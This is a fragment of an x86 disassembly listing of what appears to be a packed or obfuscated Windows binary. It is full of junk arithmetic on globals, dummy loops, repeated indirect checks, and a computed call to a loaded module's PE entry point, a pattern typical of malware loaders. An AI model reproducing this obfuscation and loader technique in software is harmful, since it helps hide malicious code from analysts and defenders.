  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428d05
  41c331:	mov    ebx,DWORD PTR ds:0x42af59
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af61
  41c85f:	mov    eax,ds:0x42af6d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
